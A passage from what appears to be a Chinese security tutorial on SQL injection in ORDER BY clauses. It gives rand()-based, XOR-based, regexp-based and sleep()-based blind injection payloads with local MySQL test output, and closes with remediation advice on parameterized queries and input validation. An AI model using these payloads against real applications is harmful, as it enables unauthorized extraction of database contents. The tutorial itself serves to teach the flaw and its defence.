+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165647631.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165647631.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165647631.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165647631.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 470;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>网上有些文章直接用数字代替列名，如<code>if(1=1,1,4)</code>，但是本地测试时两个版本都没有成功。如下：</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165657542.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165657542.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165657542.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165657542.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 620;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165707025.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165707025.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165707025.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165707025.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 656;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="2rand" class="heading-element"><span>2）rand</span>
+  <a href="#2rand" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>利用rand() true和false返回顺序不同进行盲注。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">rand</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165723761.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165723761.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165723761.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165723761.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 1419;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="3位运算符" class="heading-element"><span>3）位运算符</span>
+  <a href="#3%e4%bd%8d%e8%bf%90%e7%ae%97%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>位运算符，主要使用^异或运算，其他也可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="mi">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="mi">1</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;8&#39;</span><span class="p">);</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">^</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;6&#39;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165803446.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165803446.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165803446.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165803446.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 1143;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">order by id^(select (select version()) regexp &#39;^5&#39;);order by id^(select (select version()) regexp 0x5e35);  # 0x5e35 &lt;-&gt; hex(&#39;^5&#39;) # 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165815046.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165815046.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165815046.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165815046.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 968;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="6时间盲注" class="heading-element"><span>6、时间盲注</span>
+  <a href="#6%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+--------+----------+------+-----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+--------+----------+------+-----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+--------+----------+------+-----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4</span><span class="w"> </span><span class="n">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="p">.</span><span class="mi">02</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="k">if</span><span class="p">((</span><span class="nf">substr</span><span class="p">(</span><span class="nf">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">8</span><span class="p">),</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+--------+----------+------+-----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+--------+----------+------+-----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+--------+----------+------+-----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4</span><span class="w"> </span><span class="n">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165900602.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165900602.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165900602.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165900602.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 601;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="修复建议" class="heading-element"><span>修复建议</span>
+  <a href="#%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>要防止sql注入攻击，建议采取以下措施：
+1、使用参数绑定或预编译语句：使用参数化查询或预编译语句，将用户提供的输入作为参数传递给SQL查询，而不是将其直接拼接到查询字符串中。这样可以防止恶意输入被解释为SQL代码。
+2、输入验证和过滤：对于动态生成的列名或表达式，确保对用户输入进行严格的验证和过滤，只允许合法的值和字符，避免将恶意输入传递给SQL查询。
